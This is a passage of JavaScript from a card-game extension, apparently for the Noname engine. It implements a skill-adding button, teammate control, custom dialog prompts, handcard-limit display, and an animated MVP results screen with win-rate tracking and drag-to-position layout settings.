                player.chooseTarget(lib.filter.all, [1, 1], '选择一名角色获得你选择的技能')
                'step 2'
                if (!result?.targets?.[0]) return;
                const target = result.targets[0];
                target.addSkillLog(event.skills);
            },
        }
        lib.translate['_qy-search-skill'] = '添加技能';
        lib.translate['_qy-search-skill_info'] = '会进行弹窗，然后需要输入武将ID或者武将名称，之后搜索武将，并展示该武将的所有技能，之后点击技能即可选择，选择完毕后点击确定选择给指定的武将添加。';
        //
        if (config.qingyao_searchSkill) {
            CustomButtons.push({
                innerHTML: '添',
                css: {
                    left: '650px',
                    top: '270px',
                    transition: 'none',
                    zIndex: 9,
                },
                endDang: function (event) {
                    event.stopPropagation();
                    var next = game.createEvent('xxxx', false);
                    next.player = game.me;
                    next.setContent(lib.skill['_qy-search-skill'].content)
                },
                moveStop: function (event) {
                    event.stopPropagation();
                    var translate = this._translate.slice(0);
                    lib.config.qySearchSkillPosition = translate;
                    game.saveConfig('qySearchSkillPosition', translate);
                },
                memory: 'qySearchSkillPosition',
                CustomName: 'qySearchSkill',
                fixed: false,
                class: '.menubutton.round.highlight',
            });
        }
    }

    // 手牌刷新
    if (config.qingyao_shoupaishangxian) {
        var libUpdate = player => {
            var numh = player.countCards('h');
            var nummh = player.getHandcardLimit();
            if (nummh == Infinity) nummh = '∞';
            player.node.count.innerHTML = numh + '/' + nummh;
        }
        if (Array.isArray(lib.element.player.updates)) {
            lib.element.player.updates.unshift(libUpdate)
        } else {
            lib.element.player.updates = [libUpdate]
        }
    }
    // 控制队友
    if (config.qingyao_kongzhiduiyou) {
        lib.skill._qingyao_kongzhiduiyou = {
            firstDo: true,
            trigger: {
                global: 'gameStart',
                player: ['playercontrol', 'chooseToUseBegin', 'chooseToRespondBegin', 'chooseToDiscardBegin', 'chooseToCompareBegin', 'chooseButtonBegin', 'chooseCardBegin', 'chooseTargetBegin', 'chooseCardTargetBegin', 'chooseControlBegin', 'chooseBoolBegin', 'choosePlayerCardBegin', 'discardPlayerCardBegin', 'gainPlayerCardBegin']
            },
            forced: true,
            priority: 97,
            forceDie: true,
            popup: false,
            silent: true,
            mode: ['identity', 'guozhan', 'doudizhu', 'boss'],
            filter: function (event, player, name) {
                if (name == 'gameStart') return true;
                if (player._trueMe) return false;
                if (!_status.kongzhiduiyou) return false;
                if (event.autochoose && event.autochoose()) return false;
                if (lib.filter.wuxieSwap(event)) return false;
                if (_status.auto) return false;
                if (get.mode() == 'boss') return player.side == game.boss.side;
                if (get.mode() == 'identity') {
                    if (get.translation(player.identity) != (get.translation(player.node.identity.dataset.color) || player.node.identity.firstChild.innerHTML)) return false;
                }
                if (get.mode() == 'guozhan') {
                    var players = game.players.concat(game.dead);
                    for (var i = 0; i < players.length; i++) {
                        if (players[i].identity == 'ye') {
                            if ([].concat(players[i].storage.yexinjia_friend).contains(player)) return true;
                        }
                    }
                    if (!player.node.identity.firstChild.innerHTML || player.node.identity.firstChild.innerHTML == '') return false;
                    if ((get.translation(lib.character[player.name1][5]) || get.translation(lib.character[player.name1][1])) != player.node.identity.firstChild.innerHTML) return false;
                }
                return game.me.getFriends().contains(player);
            },
            content: function () {
                'step 0'
                if (event.triggername == 'gameStart') {
                    _status.kongzhiduiyou = true;
                    return event.finish();
                }
                if (get.mode() == 'guozhan') {
                    game.me.group = (lib.character[player.name1][5] || lib.character[player.name1][1]);
                    game.me.node.identity.firstChild.innerHTML = get.translation(game.me.group);
                    //game.me.showCharacter(true);
                } else if (game.me.showIdentity) game.me.showIdentity(true);
                'step 1'
                if (get.mode() == 'boss') {
                    var func = function (player) {
                        game.swapControl(player);
                        game.onSwapControl();
                        if (game.me.side != game.boss.side) {
                            game.swapPlayerAuto(player);
                        } else {
                            game.singleHandcard = true;
                            ui.arena.classList.add('single-handcard');
                            ui.window.classList.add('single-handcard');
                            ui.fakeme.style.display = '';
                            var players = game.players.concat(game.dead);
                            var position = [];
                            var seat = [];
                            for (var i = 0; i < players.length; i++) {
                                position.push(players[i].dataset.position);
                            }
                            position.sort((x, y) => x - y);
                            for (var i = 0; i < position.length; i++) {
                                for (var j = 0; j < players.length; j++) {
                                    if (position[i] == players[j].dataset.position) seat.add(players[j]);
                                }
                            }
                            while (seat[0] != player) {
                                seat.push(seat.shift());
                            }
                            for (var i = 0; i < seat.length; i++) {
                                seat[i].dataset.position = position[i];
                            }
                            if (game.me && game.me.node.handcards2.childNodes.length) {
                                while (game.me.node.handcards2.childNodes.length) {
                                    game.me.node.handcards1.appendChild(game.me.node.handcards2.firstChild);
                                }
                            }
                        }
                    }
                    if (game.me != player) func(player);
                } else game.swapPlayerAuto(player);
            },
        };
    }
    // 弹窗
    game.qyprompt = function () {
        var str, forced, callback, noinput = false, str2 = '', confirmText = '确定', cancelText = '取消';
        for (var i = 0; i < arguments.length; i++) {
            const argument = arguments[i];
            if (argument == 'alert') {
                forced = true;
                callback = function () {
                };
                noinput = true;
            } else if (argument === 'oninput') {
                noinput = true;
            } else if (typeof argument == 'string') {
                if (argument.indexOf("confirm:") === 0) {
                    confirmText = argument.slice(8);
                } else if (argument.indexOf("cancel:") === 0) {
                    cancelText = argument.slice(7);
                } else if (argument.indexOf('###') == 0) {
                    var list = argument.slice(3).split('###');
                    str = list[0];
                    str2 = list[1];
                } else str = argument;
            } else if (typeof argument == 'boolean') {
                forced = argument;
            } else if (typeof argument == 'function') {
                callback = argument;
            }
        }
        if (!callback) {
            return;
        }
        var promptContainer = ui.create.div('.popup-container', {
            zIndex: 100,
        }, ui.window, function () {
            if (this.clicked) {
                this.clicked = false;
            } else {
                clickCancel();
            }
        });
        // 阻止冒泡事件
        promptContainer.onclick = event => event.stopPropagation();
        var dialogContainer = ui.create.div('.prompt-container', promptContainer);
        var dialog = ui.create.div('.menubg', ui.create.div(dialogContainer), function (event) {
            promptContainer.clicked = true;
        });

        if (lib.qyUtils.isMobile) {
            dialog.style.top = '-30%'
        }

        var strnode = ui.create.div('', str || '', dialog);
        var input = ui.create.node('input', ui.create.div(dialog));
        input.value = str2;
        if (noinput) {
            input.style.display = 'none';
        }
        var controls = ui.create.div(dialog);
        var clickConfirm = function () {
            if (noinput) {
                promptContainer.remove();
                callback(true);
            } else if (input.value) {
                callback(input.value);
                promptContainer.remove();
            }
        }
        var clickCancel = function () {
            if (!forced) {
                callback(false);
                promptContainer.remove();
            }
        }
        var confirmNode = ui.create.div('.menubutton.large.disabled', confirmText, controls, clickConfirm);
        confirmNode.onclick = event => event.stopPropagation();
        if (!forced) {
            var cancelNode = ui.create.div('.menubutton.large', cancelText, controls, clickCancel);
            cancelNode.onclick = event => event.stopPropagation();
        }
        if (noinput) {
            confirmNode.classList.remove('disabled');
        } else {
            input.onkeydown = function (e) {
                if (e.keyCode == 13) {
                    clickConfirm();
                } else if (e.keyCode == 27) {
                    clickCancel();
                }
            }
            input.onkeydown = function (event) {
                event && event.stopPropagation();
                if (event.keyCode === 13) {
                    clickConfirm();
                }
            }
            input.onkeyup = function (event) {
                event && event.stopPropagation();
                if (input.value) {
                    confirmNode.classList.remove('disabled');
                } else {
                    confirmNode.classList.remove('disabled');
                }
            }
            requestAnimationFrame(() => {
                input.onkeyup();
                input.focus();
            });
        }
        return promptContainer;
    }
    // 询问
    game.qyconfirm = function (str, callback) {
        return game.qyprompt('alert', str, false, callback);
    }
    // 提示
    game.qyalert = function (str, callback) {
        return game.qyprompt('alert', str, true, callback);
    }

    // MVP
    if (config.qingyao_shoushaMVP) {
        lib.qyMvpWinningRate = {
            configKey: 'qyMvpWinningRate',
            /**
             * 获取单个武将的MVP总结 向上取整
             * @param characterID 武将ID
             * @return [总场次, MVP次数, 胜率]
             */
            load(characterID) {
                const qyMvpWinningRate = this.qyMvpWinningRate;
                let extensionConfig = game.getExtensionConfig('假装无敌', this.configKey);
                // 配置不存在，就初始化保存配置
                if (!extensionConfig) {
                    extensionConfig = {};
                    this.save();
                }
                // 获取单个武将的胜率
                let characterMvpConfig = !extensionConfig[characterID];
                if (characterMvpConfig) {
                    extensionConfig[characterID] = [0, 0, '0.00%'];
                    this.save();
                }
                // 返回单个武将的 [100, 20, '20%']
                return extensionConfig[characterID];
            },
            /**
             * 获取单个武将的总场次
             * @param characterID
             * @return {总场次}
             */
            getGames(characterID) {
                const load = this.load(characterID);
                return load[0];
            },
            /**
             * 获取单个武将的MVP胜利场次
             * @param characterID
             * @return {总场次}
             */
            getMvpWinning(characterID) {
                const load = this.load(characterID);
                return load[1];
            },
            /**
             * 获取并增加单个武将的MVP场次
             * @param characterID 武将ID
             * @param value 增加的值
             */
            getAndAddMvp(characterID, value) {
                if (typeof value !== 'number') value = 1;
                const load = this.load(characterID);
                load[1] += value;
                load[2] = this.getRate(load[0], load[1]);
                this.save();
                return load[1]
            },
            /**
             * 获取并增加单个武将的总场次
             * @param characterID 武将ID
             * @param value 增加的值
             */
            getAndAddGame(characterID, value) {
                if (typeof value !== 'number') value = 1;
                const load = this.load(characterID);
                load[0] += value;
                load[2] = this.getRate(load[0], load[1]);
                this.save();
                return load[0]
            },
            /**
             * 获取单个武将的MVP胜率
             * @param characterID
             * @return {胜率}
             */
            getMvpRate(characterID) {
                const load = this.load(characterID);
                return load[2];
            },
            /**
             * 获取MVP胜率
             * @param totle 总场次 如果为0，则设置为1
             * @param num MVP次数
             * @return {string} 胜率
             */
            getRate(totle, num) {
                if (totle === 0) {
                    totle = 1;
                }
                return ((num / totle) * 100).toFixed(2) + '%';
            },
            // 保存设置
            save() {
                // 获取配置，然后设置上值
                let extensionConfigValue = game.getExtensionConfig('假装无敌', this.configKey);
                if (!extensionConfigValue || typeof extensionConfigValue !== 'object' || Array.isArray(extensionConfigValue)) {
                    extensionConfigValue = {};
                }
                game.saveExtensionConfig('假装无敌', this.configKey, extensionConfigValue);
            },
        }
        _status.手杀MVP = function (sd, isDragLocation) {
            if (_status.showShoushaMvp) return false;
            _status.showShoushaMvp = true;
            ui.dialogs[0] && ui.dialogs[0].hide();
            // 隐藏结算面板
            if (_status.qyGameResultControl && !_status.qyGameResultControl.isHidden) _status.qyGameResultControl.click();
            if (!sd) {
                JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, "qy_sf_jiesuan_quanchangzuijia", {
                    centerPosition: true,
                    scale: 1.5,
                });
            }

            setTimeout(item => {
                var dialog = Array.from(ui.arena.querySelectorAll(".dialog"));
                dialog.forEach(value => value.hide());
                game.playqysstx('images/asqx.mp3');
                // 首先获取所有存活的武将，并作为备份数据
                var players = game.players.slice(0);
                // 将死亡的武将加入到存活武将中
                game.players = game.players.concat(game.dead);
                // 进行分数计算
                if (!_status.showShouSha局势) {
                    game.players.forEach(value => {
                        if (game.dead.contains(value)) {
                            value.局势分数 -= 20;
                        }
                        value.getEnemies().forEach(current => {
                            if (game.dead.contains(current) || current.isDead()) {
                                value.局势分数 += 5;
                            }
                        })
                        value.getFriends().forEach(current => {
                            if (current.isDead() || game.dead.contains(current))
                                value.局势分数 -= 5;
                        })
                    })
                }
                // 还原武将
                game.players = players;
                /**
                 * 冒泡排序
                 * @param {Array} arr 需要排序的数组
                 */
                const sort = function (arr) {
                    const len = arr.length;
                    for (let i = 0; i < len - 1; i++) {
                        for (let j = 0; j < len - 1 - i; j++) {
                            const curPlayer = arr[j];
                            const nextPlayer = arr[j + 1];
                            if (curPlayer.mvpCount > nextPlayer.mvpCount) {
                                [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];
                            }
                        }
                    }
                    return arr;
                }

                const sorts = sort(game.players.concat(game.dead)).reverse();
                const player = sorts[0];
                // 记录MVP胜率
                if (!_status.showShouSha局势) {
                    if (player && (!sd && !isDragLocation)) {
                        lib.qyMvpWinningRate.getAndAddMvp(player.name1);
                        if (player.name2) {
                            lib.qyMvpWinningRate.getAndAddMvp(player.name2);
                        }
                    }
                }
                // 标示
                _status.showShouSha局势 = true;

                // mvp骨骼动画
                let mvpSpineAnimation = window.qyAnimationUtil.generatorUUID();
                const qy_Ss_DaTing_ChunJie_BeiJing_UUID = window.qyAnimationUtil.generatorUUID();
                let mvpSpineAnimationName = null;
                // 左边的按钮选项
                let radioGroup = null;
                // 点击关闭MVP
                const click = (event, forecd) => {
                    if (event) event.stopPropagation();
                    if (isDragLocation && !forecd) return false;
                    popuperContainer.delete(200);
                    darkPopupContainer.remove();
                    ui.dialogs[0] && ui.dialogs[0].show();
                    _status.showShoushaMvp = false;
                    if (mvpSpineAnimation) {
                        JzwdWebWorkerDestroySpine(mvpSpineAnimation, qy_Ss_DaTing_ChunJie_BeiJing_UUID);
                    }
                    if (radioGroup) radioGroup.remove();
                    radioGroup = mvpSpineAnimation = null;
                    // 显示结算面板
                    if (_status.qyGameResultControl && _status.qyGameResultControl.isHidden) _status.qyGameResultControl.click();
                    ui.arena.appendChild(lib.qyPlayerAppContainer);
                };
                // 遮罩层
                var popuperContainer = ui.create.div('.popup-container', {zIndex: 103}, ui.window);
                popuperContainer.addEventListener('click', click);
                const darkPopupContainer = ui.create.div('.popup-container', {
                    zIndex: 99,
                    backgroundColor: 'rgb(0,0,0,.6)',
                }, ui.window);
                popuperContainer.dataset.qingyaoHiddenMvpBorder = game.getExtensionConfig('假装无敌', 'qingyao_hiddenMVPBorder');
                !function tryVictoryAudio() {
                    // 胜利语音的路径
                    let victoryURL = `${lib.qySkinAudio.audioVictoryPath}/${player.name1}/victory.mp3`;
                    const skinName = lib.qySkinAudio.getSkinName(player.name1);
                    if (skinName !== false) {
                        victoryURL = `${lib.qySkinAudio.audioVictoryPath}/${player.name1}/${skinName}/victory.mp3`;
                    }
                    const existence = lib.qyUtils.checkFileExistence(victoryURL);
                    if (existence) {
                        game.playAudio('../', victoryURL)
                    } else {
                        // 播放技能语音
                        const skills = player.skills.filter(value => lib.skill[value].audio);
                        skills.length && game.trySkillAudio(skills.randomGet(), player, true);
                    }
                }()
                // 缩放兼容
                const getUiZoom = (function () {
                    var zoom = lib.config.ui_zoom;
                    switch (zoom) {
                        case 'esmall':
                            zoom = 0.8;
                            break;
                        case 'vsmall':
                            zoom = 0.9;
                            break;
                        case 'small':
                            zoom = 0.93;
                            break;
                        case 'big':
                            zoom = 1.05;
                            break;
                        case 'vbig':
                            zoom = 1.1;
                            break;
                        case 'ebig':
                            zoom = 1.2;
                            break;
                        default:
                            zoom = 1;
                    }
                    return zoom;
                }());
                if (getUiZoom) popuperContainer.style.zoom = 2 - getUiZoom;
                // 前缀
                let prefix = lib.qyUtils.getConfig('qingyao_toggle_MVP', 'ShouSha');
                if (prefix === true) {
                    prefix = 'GangBan';
                    game.saveExtensionConfig('假装无敌', 'qingyao_toggle_MVP', prefix);
                } else if (prefix === false) {
                    prefix = 'ShouSha';
                    game.saveExtensionConfig('假装无敌', 'qingyao_toggle_MVP', prefix);
                }
                if (!['ShouSha', 'GangBan', 'MinJian', 'MoGaiGangBan'].contains(prefix)) {
                    click(null, true);
                    return alert("请到【界】里面设置MVP的类型，当前类型：" + prefix)
                }
                // 构造武将图、主武将、副武将
                let avatar = ui.create.div('.qy-avatar', popuperContainer);
                avatar.style.backgroundImage = player.node.avatar.style.backgroundImage;

                // 构造武将边框
                let avatarBorder = ui.create.div('.qy-avatar-border', popuperContainer);
                avatarBorder.dataset.name = get.translation(player.name);
                avatarBorder.setBackgroundImage(`extension/清瑶葭绮/members/假装无敌/images/border_${player.group}.png`);
                // 炎龙武将框
                let qyMvpSilverD1,
                    qyMvpSilverD2;
                if (game.getExtensionConfig('假装无敌', 'qingyao_characterBoreder')) {
                    qyMvpSilverD1 = ui.create.div('.qy-mvp-silver-d1', avatarBorder);
                    qyMvpSilverD2 = ui.create.div('.qy-mvp-silver-d2', avatarBorder);
                }

                /**
                 * 读取原画
                 * @param name
                 * @param avatar
                 */
                const readOriginAvater = function (name, avatar) {
                    if (!game.getExtensionConfig("假装无敌", "qingyao_read_origin_draw")) return;
                    const originImage = get.characterOriginImage(name, 'not:character');
                    if (!originImage) return;
                    avatar.style.backgroundImage = `url(${lib.assetURL}${originImage})`;
                }
                // 播放MVP特效
                switch (prefix) {
                    case 'ShouSha':
                        let config = {
                            skeScale: 1, skeX: 400, loop: true, skeY: 310,
                        }
                        if (lib.config.touchscreen) {
                            config = {
                                skeScale: 1.05, skeX: 423, loop: true, skeY: 332,
                            }
                        }
                        JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, ['qy_mvp', 'animation'], Object.assign(config, {
                            event: {
                                complete: function (track) {
                                    track.animationStart = 1
                                },
                                start: function (track) {
                                    // mvpSpineAnimation.spine.skeleton.slots[0].currentSprite.x = -210
                                    this.spine.state.expandToIndex(0).animationEnd = 14
                                }
                            },
                        }, game.getExtensionConfig('假装无敌', 'qy_mvp_new') || {}), mvpSpineAnimation);
                        mvpSpineAnimationName = 'qy_mvp_new';
                        // 设置class样式
                        avatar.classList.add('qy-shousha-avatar')
                        avatarBorder.classList.add('qy-shousha-avatar-border');
                        // 炎龙武将边框样式
                        if (qyMvpSilverD1) {
                            qyMvpSilverD1.classList.add('qy-shousha-mvp-silver-d1');
                        }
                        break;
                    case 'GangBan':
                        JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, 'qy_quanchangzuijia', Object.assign({
                            skeScale: 0.6, loop: true, skeX: 476, skeY: 312
                        }, {
                            event: {
                                complete: function (track) {
                                    this.changeAnimation('play2', true);
                                }
                            },
                        }, game.getExtensionConfig('假装无敌', 'qy_quanchangzuijia_new') || {}), mvpSpineAnimation);
                        mvpSpineAnimationName = 'qy_quanchangzuijia_new';
                        break;
                    case 'MinJian':
                        JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, ['qy_sf_jiesuan_wujiangchuxian2', 'play2'], Object.assign({
                            skeScale: 0.74, loop: true, skeX: 364, skeY: 308
                        }, game.getExtensionConfig('假装无敌', 'qy_sf_jiesuan_wujiangchuxian2_new') || {}), mvpSpineAnimation);
                        mvpSpineAnimationName = 'qy_sf_jiesuan_wujiangchuxian2_new';
                        break;
                    case 'MoGaiGangBan':
                        JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, ['qy_quanchangzuijia', 'play2'], Object.assign({
                            skeScale: 0.6, loop: true, skeX: 476, skeY: 312
                        }, game.getExtensionConfig('假装无敌', 'qy_quanchangzuijia_mogai_new') || {}), mvpSpineAnimation);
                        mvpSpineAnimationName = 'qy_quanchangzuijia_mogai_new'
                        // 是否双将
                        const isDoubleCharacter = (lib.config.mode == 'guozhan') || (get.config('double_character') && lib.config.mode !== 'guozhan') || (player.name2 && player.node.avatar2 && !player.node.avatar2.classList.contains('hidden'));
                        // 武将图包裹器
                        const avatarContainer = ui.create.div('.qy-avatar-container', avatarBorder);
                        avatar.remove();
                        avatar = ui.create.div('.qy-avatar1', avatarContainer);
                        avatar.style.backgroundImage = player.node.avatar.style.backgroundImage
                        // 双将
                        if (isDoubleCharacter) {
                            ui.create.div('.GangBanMoGaiMVPLine', avatarContainer);
                            const avatar2 = ui.create.div('.qy-avatar2', avatarContainer);
                            avatar2.style.backgroundImage = player.node.avatar2.style.backgroundImage;
                            avatarBorder.dataset.name += '&' + get.translation(player.name2);
                            readOriginAvater(player.name2, avatar2);
                        }
                        break;
                    default:
                        mvpSpineAnimation = null
                        break;
                }

                if (!mvpSpineAnimation) {
                    click(null, true);
                    return game.qyalert("请到【界】里面设置MVP的类型，当前类型：" + prefix);
                }
                // 前缀
                popuperContainer.classList.add(`qy${prefix}MVP`);
                popuperContainer.appendChild(lib.qyPlayerAppContainer);
                // 露头配置、后续迭代删掉
                if (game.getExtensionConfig("假装无敌", "qingyao_outcrop")) {
                    var isMobeil = navigator.userAgent.match(/(Android|iPhone|SymbianOS|Windows Phone|iPad|iPod)/i) === null;
                    avatar.css({
                        height: isMobeil ? '59vh' : '370px',
                        top: isMobeil ? '17.6vh' : '56px',
                    })
                }
                // 读取原画
                readOriginAvater(player.name1, avatar);
                // 公共代码部分
                // 分享按钮
                ui.create.div('.qy-mvp-share-button', popuperContainer).addEventListener('click', event => {
                    event.stopPropagation();
                    lib.qyUtils.shareScreenShot();
                });
                // 查找势力边框
                const borderURL = `extension/清瑶葭绮/members/假装无敌/images/border_${player.group}.png`;
                // 未找到，就设置为默认的群边框
                if (!lib.qyUtils.checkFileExistence(borderURL)) {
                    avatarBorder.setBackgroundImage(`extension/清瑶葭绮/members/假装无敌/images/border_qun.png`);
                }
                // 星的边框
                const xing = ui.create.div(avatarBorder, '.qy-mvp-border-xing');
                const num = get.qyRateNum(player.name);
                for (var numKey = 0; numKey < num; numKey++)
                    ui.create.div('.item.on', xing);
                for (numKey = 0; numKey < 5 - num; numKey++)
                    ui.create.div('.item.off', xing);
                const rightInfo = ui.create.div('.qy-mvp-right-info', popuperContainer);
                const rightContainer = ui.create.div('.qy-mvp-right-container', rightInfo, {
                    flex: 0.6,
                });
                const icon = ui.create.div('.qy-mvp-player-icon', {
                    height: '80px',
                }, rightContainer);
                const qyIconImage = game.getExtensionConfig('假装无敌', 'qyIconImage');
                if (qyIconImage)
                    icon.css({
                        backgroundImage: `url("${lib.assetURL}${qyIconImage}")`
                    });
                var playerInfo = ui.create.div('.qy-mvp-player-info', rightContainer);
                ui.create.div('.qy-mvp-name-title', '玩家名称', playerInfo);
                var nickname = ui.create.div('.qy-mvp-player-nickname', playerInfo, player === game.me ? lib.config.connect_nickname : get.translation(player.name));
                if (game.me === player) ui.create.node('img', nickname).src = lib.assetURL + 'extension/清瑶葭绮/members/假装无敌/images/mvp_me_tag.png';
                ui.create.div('.qy-mvp-player-technology', `技术分：${player.mvpCount}`, playerInfo);
                var technology = ui.create.div('.qy-mvp-technology', rightInfo);
                var table = ui.create.node('table', technology, {width: "100%"});
                var list = ['攻击分数', '治疗分数', '辅助分数', '局势分数', '惩罚扣分'];
                list.forEach(value => {
                    var tr = ui.create.node('tr', table);
                    tr.style.color = 'rgb(234, 138, 76)';
                    var td = ui.create.node('td', tr, value);
                    var num = (player[value] || 0);
                    var num2 = (sorts[1][value]);
                    td = ui.create.node('td', tr).innerHTML = num + (num - num2 >= 30 ? '<span class="qy-mvp-yylx">(遥遥领先)</span>' : '');
                });
                // MVP烟花特效
                if (game.getExtensionConfig('假装无敌', 'qingyao_mvp_fireworks')) {
                    JzwdWebWorkerOrMainWorker(lib.qyPlayerApp, 'qy_Ss_DaTing_ChunJie_BeiJing', {
                        loop: true,
                        scale: 0.7,
                        centerPosition: true,
                        prepLoad: function (spineData) {
                            const qy_Ss_DaTing_ChunJie_BeiJingList = [0, 1];
                            qy_Ss_DaTing_ChunJie_BeiJingList.forEach(index => {
                                spineData.slots[index].color.a = 0
                            });
                            const qy_Ss_DaTing_ChunJie_BeiJing11boundData = {
                                y: -400,
                                scaleX: 2,
                                scaleY: 2,
                            }
                            Object.assign(spineData.slots[11].boneData, qy_Ss_DaTing_ChunJie_BeiJing11boundData);
                        },
                    }, qy_Ss_DaTing_ChunJie_BeiJing_UUID);
                }

                // 拖拽排序代码 - 最简易的实现方式
                const dragClassList = ['.qy-mvp-right-container', '.qy-avatar-1', '.qy-avatar-border-1', '.qy-avatar-border', '.qy-mvp-technology', '.qy-mvp-border-xing', '.qy-mvp-share-button', '.qy-avatar'];
                const zoomClassList = ['.qy-avatar', '.qy-avatar-border', '.qy-mvp-player-icon', '.qy-mvp-border-xing'];
                if (isDragLocation) {
                    (function dragMvp() {
                        // 声明
                        if (!game.getExtensionConfig('假装无敌', 'fistDragMvpInfo')) {
                            game.saveExtensionConfig('假装无敌', 'fistDragMvpInfo', true)
                            let info = ["注意：此为【假装无敌】MVP拖拽操作", "1.此操作会覆盖漏头设置", "2.移动的单位为px", '3.自由调整大小点击周围边框和四个红点即可开始调整'];
                            if (navigator.userAgent.match(/(Android|iPhone|SymbianOS|Windows Phone|iPad|iPod)/i) === null) {
                                info.push('4.电脑版会出现窗口缩放后位置不准的情况，请谨慎使用！');
                            }
                            alert(info.join("\n"));
                        }

                        // 遍历拥有class的元素
                        for (let drawClassElement of dragClassList) {
                            let element = document.querySelector(drawClassElement);
                            // 没有找到这个元素，跳过循环
                            if (element === null) continue;
                            // 给元素加上边框,取消动画过渡
                            element.style.border = '2px dashed #fff';
                            element.style.transition = "none";
                            // 添加上移动事件
                            window.zyile_dragZoom(element, popuperContainer, true, true);
                            drawClassElement = prefix + drawClassElement
                            element.addEventListener('moveStop', event => {
                                lib.config[drawClassElement] = [element.style.left, element.style.top];
                                game.saveExtensionConfig('假装无敌', drawClassElement, lib.config[drawClassElement]);
                                lib.config[`${drawClassElement}_zoom`] = [element.style.width, element.style.height];
                                game.saveExtensionConfig('假装无敌', `${drawClassElement}_zoom`, lib.config[`${drawClassElement}_zoom`]);
                            })
                        }
                        zoomClassList.forEach(clazz => {
                            let element = document.querySelector(clazz);
                            // 没有找到这个元素，跳过循环
                            if (element === null) return;
                            // 给元素加上边框,取消动画过渡
                            element.style.border = '2px dashed #fff';
                            element.style.transition = "none";
                            new window.qingyaoZoom(element)
                            clazz = prefix + clazz
                            element.addEventListener('zoomStop', event => {
                                lib.config[clazz] = [element.style.left, element.style.top];
                                game.saveExtensionConfig('假装无敌', clazz, lib.config[clazz]);
                                lib.config[`${clazz}_zoom`] = [element.style.width, element.style.height];
                                game.saveExtensionConfig('假装无敌', `${clazz}_zoom`, lib.config[`${clazz}_zoom`]);
                            })
                        })
                        let settingOver = ui.create.div('.qy-button.qy-button--primary', '设置完毕', popuperContainer, {
                            position: 'fixed',
                            bottom: '88px',
                            left: '38px',
                            zIndex: 9999,
                        });
                        settingOver.addEventListener('click', event => {
                            dragClassList.concat(zoomClassList).forEach(clazz => {
                                let element = document.querySelector(clazz);
                                if (element == null) return;
                                clazz = prefix + clazz
                                lib.config[clazz] = [element.style.left, element.style.top];
                                game.saveExtensionConfig('假装无敌', clazz, lib.config[clazz]);
                                lib.config[`${clazz}_zoom`] = [element.style.width, element.style.height];
                                game.saveExtensionConfig('假装无敌', `${clazz}_zoom`, lib.config[`${clazz}_zoom`]);
                            });
                            lib.qyWorkerGetInfoBySpineId({uuid: mvpSpineAnimation}, (data, error) => {
                                if (error) {
                                    return lib.qyMessage.queueMessageError(error);
                                }
                                if (Object.keys(data).length === 0) {
                                    return lib.qyMessage.queueMessageError(`根据spineId：${mvpSpineAnimation}，未找到正在播放的特效！`);
                                }
                                game.saveExtensionConfig('假装无敌', mvpSpineAnimationName, {
                                    skeX: data.x,
                                    skeY: data.y,
                                    skeScale: data.scale.x,
                                });
                                click(event, true);
                                lib.qyMessage.queueMessageSuccess("保存成功！");
                            })
                        });
                        let InitializeSettings = ui.create.div('.qy-button', '初始化设置', popuperContainer, {
                            position: 'fixed',
                            bottom: '28px',
                            left: '38px',
                        });
                        InitializeSettings.addEventListener('click', event => {
                            dragClassList.forEach(item => game.saveExtensionConfig('假装无敌', prefix + item));
                            zoomClassList.map(item => `${item}_zoom`).forEach(item => game.saveExtensionConfig('假装无敌', prefix + item));
                            game.saveExtensionConfig('假装无敌', mvpSpineAnimation.spineName);
                            click(event, true);
                        });

                        radioGroup = ui.create.div(document.body, {
                            position: 'fixed',
                            bottom: '150px',
                            left: '40px',
                            zIndex: 110,
                            width: '90px',
                        });
                        lib.createQyRadio(radioGroup, [{
                            label: '骨骼',
                            checked: false
                        }, {
                            label: '素材',
                            checked: true
                        }], function (label) {
                            if (label === '骨骼') {
                                darkPopupContainer.hide();
                                DragZoomHelperUtils.start({spineId: mvpSpineAnimation, parent: popuperContainer}, val => {
                                    let msg = "点击进行拖拽，鼠标滚轮进行缩放";
                                    if (lib.qyUtils.isMobile) {
                                        msg = "单指移动，双指缩放。";
                                    }
                                    lib.qyMessage.queueMessageInfo(msg);
                                });
                            } else {
                                darkPopupContainer.show();
                                DragZoomHelperUtils.close(mvpSpineAnimation);
                            }
                        })
                    })()
                }
                // 移动位置
                dragClassList.map(item => [document.querySelector(item)].concat(game.getExtensionConfig('假装无敌', prefix + item) || [null, null]))
                    .filter(arrayElement => arrayElement[0] != null)
                    .forEach(arrayElement => {
                        let element = arrayElement[0];
                        if (arrayElement[1] != null) element.style.left = arrayElement[1]
                        if (arrayElement[2] != null) element.style.top = arrayElement[2]
                    })
                zoomClassList.map(item => [document.querySelector(item)].concat(game.getExtensionConfig('假装无敌', `${prefix}${item}_zoom`) || [null, null]))
                    .filter(arrayElement => arrayElement[0] != null)
                    .forEach(arrayElement => {
                        let element = arrayElement[0];
                        if (arrayElement[1] != null) element.style.width = arrayElement[1]
                        if (arrayElement[2] != null) element.style.height = arrayElement[2]
                    })

            }, !sd && 1000 || 0);
        }


        lib.element.player.getAllFriends = function (func) {
            var player = this;
            var targets;
            var mode = get.mode();
            var self = false;
            if (func === true) {
                func = null;
                self = true;
            }
            if (mode == 'identity') {
                if (_status.mode == 'purple') {
                    switch (player.identity) {
                        case 'rZhu':
                        case 'rZhong':
                        case 'bNei':
                            targets = game.filterPlayer2(function (target) {
                                if (func && !func(target)) return false;
                                return ['rZhu', 'rZhong', 'bNei'].contains(target.identity);
                            });
                            break;
                        case 'bZhu':
                        case 'bZhong':
                        case 'rNei':
                            targets = game.filterPlayer2(function (target) {
                                if (func && !func(target)) return false;
                                return ['bZhu', 'bZhong', 'rNei'].contains(target.identity);
                            });
                            break;
                        case 'rYe':
                        case 'bYe':
                            targets = game.filterPlayer2(function (target) {
                                if (func && !func(target)) return false;
                                return ['rYe', 'bYe'].contains(target.identity);
                            });
                            break;
                    }
                } else {
                    switch (player.identity) {
                        case 'zhu':
                        case 'zhong':
                        case 'mingzhong':
                            targets = game.filterPlayer2(function (target) {
                                if (func && !func(target)) return false;
                                return ['zhu', 'zhong', 'mingzhong'].contains(target.identity);
                            });
                            break;
                        case 'nei':
                            targets = [];
                            break;
                        case 'fan':
                            targets = game.filterPlayer2(function (target) {
                                if (func && !func(target)) return false;
